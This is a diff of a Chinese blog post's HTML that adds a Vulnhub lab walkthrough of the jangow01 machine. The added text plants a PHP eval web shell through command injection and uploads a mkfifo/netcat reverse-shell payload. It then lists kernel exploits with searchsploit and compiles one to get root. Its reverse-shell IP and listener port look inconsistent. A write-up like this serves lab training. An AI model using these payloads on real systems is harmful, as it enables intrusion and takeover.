@@ -413,14 +413,14 @@ Vulnhub是仿真渗透环境，攻击者通过一系列完整的渗透思路，�
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        418
+                        1.4k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        1 分
+                        6 分
                     </div>
                     
                 
@@ -442,11 +442,11 @@ Vulnhub是仿真渗透环境，攻击者通过一系列完整的渗透思路，�
 <li>Vulnhub是仿真渗透环境，攻击者通过一系列完整的渗透思路，获得所有的flag，将全部flag成功拿到，即可证明破解了这个靶机</li>
 <li>是一个基于docker和docker-compose的漏洞环境集合，进入对应目录执行语句，即可启动漏洞环境，进行漏洞复现，让安全研究者更加专注于漏洞原理本身。</li>
 </ol>
-<h2 id="开始实战"><a href="#开始实战" class="headerlink" title="开始实战"></a>开始实战</h2><h2 id="获取靶机用户信息"><a href="#获取靶机用户信息" class="headerlink" title="获取靶机用户信息"></a>获取靶机用户信息</h2><p>刚上来第一步就是要想办法进去系统，但是什么信息都没给</p>
+<h2 id="开始实战"><a href="#开始实战" class="headerlink" title="开始实战"></a>开始实战</h2><h3 id="通过命令注入获取靶机用户信息"><a href="#通过命令注入获取靶机用户信息" class="headerlink" title="通过命令注入获取靶机用户信息"></a>通过命令注入获取靶机用户信息</h3><p>刚上来第一步就是要想办法进去系统，但是什么信息都没给</p>
 <p><img src="http://alexjakin.github.io/medias/reward/vulnhub/1/1.png" alt="靶机界面"></p>
 <p>因此先用nmap扫描一下域内所有主机，从而得到该机的IP</p>
 <blockquote>
-<p>e</p>
+<p>nmap -sP 192.168.113.1/24</p>
 </blockquote>
 <p><img src="http://alexjakin.github.io/medias/reward/vulnhub/1/2.png" alt="得到目的主机IP"></p>
 <p>接着扫描其开放的端口，发现开放了21和80端口，所以可以直接访问192.168.113.154。</p>
@@ -492,6 +492,99 @@ echo
     &quot;Connected successfully&quot;; mysqli_close($conn);
 </code></pre><p>尝试使用这个账号密码登录一下</p>
 <p><img src="http://alexjakin.github.io/medias/reward/vulnstack/1/4.png" alt="查看这台主机开放的端口"></p>
+<h3 id="上传木马获取靶机用户"><a href="#上传木马获取靶机用户" class="headerlink" title="上传木马获取靶机用户"></a>上传木马获取靶机用户</h3><p>除了上面通过命令注入观察寻找备注文件以外，还可以通过上传木马</p>
+<pre><code>
+http://192.168.113.154/site/busque.php?buscar=echo &#39;&lt;?php eval($_POST[&quot;hack&quot;]);&#39; &gt; hack.php
+
+</code></pre><p>通过蚁剑连接</p>
+<p><img src="http://alexjakin.github.io/medias/reward/vulnstack/1/5.png" alt="连接成功"></p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>由于靶机不支持nc -e，不过可以使用管道命令mkfifo，具体过程是以下步骤：</p>
+<ol>
+<li>将收到的输入写入fifo文件</li>
+<li>用cat读取fifo文件内容并发送给sh命令</li>
+<li>sh进程将它写回netcat</li>
+<li>netcat通过网络发送给client</li>
+</ol>
+<p>将下面代码写进shell.php，然后用蚁剑上传</p>
+<pre><code>
+&lt;?php system(&quot;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.113.154 4444 &gt;/tmp/f &quot;); ?&gt;
+
+</code></pre><p>在本地监听4444端口，然后访问<strong><a target="_blank" rel="noopener" href="http://192.168.113.154/site/shell.php">http://192.168.113.154/site/shell.php</a></strong></p>
+<blockquote>
+<p>nc -nlvp  443</p>
+</blockquote>
+<p><img src="http://alexjakin.github.io/medias/reward/vulnstack/1/6.png" alt="反弹shell成功"></p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>查看靶机内核版本和发行版本</p>
+<pre class=" language-text"><code class="language-text">$ uname -a
+
+Linux jangow01 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
+
+$ lsb_release -a
+
+No LSB modules are available.
+Distributor ID: Ubuntu
+Description:    Ubuntu 16.04.1 LTS
+Release:        16.04
+Codename:       xenial
+
+</code></pre>
+<p>可以发现该靶机内核是<strong>4.4.0-31</strong>，发行版本是<strong>Ubuntu 16.04</strong></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>搜索内核漏洞</p>
+<pre><code>
+└─# searchsploit ubuntu 4.4.0-31 
+------------------------------------------------ ---------------------------------
+ Exploit Title                                  |  Path
+------------------------------------------------ ---------------------------------
+Linux Kernel 4.10.5 / &lt; 4.14.3 (Ubuntu) - DCCP  | linux/dos/43234.c
+Linux Kernel 4.4.0-21 &lt; 4.4.0-51 (Ubuntu 14.04/ | windows_x86-64/local/47170.c
+Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27 | linux/local/45010.c
+Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Loc | linux/local/44298.c
+Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14 | linux/local/43418.c
+Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16. | linux/local/47169.c
+Ubuntu &lt; 15.10 - PT Chown Arbitrary PTs Access  | linux/local/41760.txt
+------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+
+
+
+└─# searchsploit ubuntu 16.04   
+--------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                         |  Path
+--------------------------------------------------------------------------------------- ---------------------------------
+Apport 2.x (Ubuntu Desktop 12.10 &lt; 16.04) - Local Code Execution                       | linux/local/40937.txt
+Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Privilege Escalation                          | linux/local/40054.c
+Google Chrome (Fedora 25 / Ubuntu 16.04) - &#39;tracker-extract&#39; / &#39;gnome-video-thumbnaile | linux/local/40943.txt
+LightDM (Ubuntu 16.04/16.10) - &#39;Guest Account&#39; Local Privilege Escalation              | linux/local/41923.txt
+Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 / CentO | linux_x86-64/local/42275.c
+Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - &#39;ldso_dy | linux_x86/local/42276.c
+Linux Kernel (Ubuntu 16.04) - Reference Count Overflow Using BPF Maps                  | linux/dos/39773.txt
+Linux Kernel 4.14.7 (Ubuntu 16.04 / CentOS 7) - (KASLR &amp; SMEP Bypass) Arbitrary File R | linux/local/45175.c
+Linux Kernel 4.4 (Ubuntu 16.04) - &#39;BPF&#39; Local Privilege Escalation (Metasploit)        | linux/local/40759.rb
+Linux Kernel 4.4 (Ubuntu 16.04) - &#39;snd_timer_user_ccallback()&#39; Kernel Pointer Leak     | linux/dos/46529.c
+Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - &#39;AF_PACKET&#39; Race Condition Privilege  | linux_x86-64/local/40871.c
+Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter &#39;target_offset&#39; Out-of-Bounds Pri | linux_x86-64/local/40049.c
+Linux Kernel 4.4.0-21 &lt; 4.4.0-51 (Ubuntu 14.04/16.04 x64) - &#39;AF_PACKET&#39; Race Condition | windows_x86-64/local/47170.c
+Linux Kernel 4.4.x (Ubuntu 16.04) - &#39;double-fdput()&#39; bpf(BPF_PROG_LOAD) Privilege Esca | linux/local/39772.txt
+Linux Kernel 4.6.2 (Ubuntu 16.04.1) - &#39;IP6T_SO_SET_REPLACE&#39; Local Privilege Escalation | linux/local/40489.txt
+Linux Kernel 4.8 (Ubuntu 16.04) - Leak sctp Kernel Pointer                             | linux/dos/45919.c
+Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation          | linux/local/45010.c
+Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                 | linux/local/44298.c
+Linux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x64) - &#39;netfilter target_offset&#39; Local Privilege | linux_x86-64/local/44300.c
+Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation | linux/local/43418.c
+Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local  | linux/local/47169.c
+--------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+</code></pre><p>选用漏洞<strong>Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation</strong> </p>
+<p>将代码下载到本地，改名为hack.c并编译</p>
+<blockquote>
+<p>gcc hack.c -o hack</p>
+</blockquote>
+<p>通过蚁剑上传漏洞，或者也可以通过ftp上传</p>
+<p>运行hack程序，并执行，提取成功</p>
+<p><img src="http://alexjakin.github.io/medias/reward/vulnstack/1/7.png" alt="提权成功"></p>
+<p><img src="http://alexjakin.github.io/medias/reward/vulnstack/1/8.png" alt="进入root目录并获取flag"></p>
+<p>路漫漫其修远兮，长途漫漫，继续加油</p>
 
             </div>
             <hr/>
@@ -947,7 +1040,7 @@ http://vulnstack.qiyuanxuetang.net/vuln/detail/2/
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">66.4k</span>
+                <span class="white-color">67.4k</span>
             
 
             
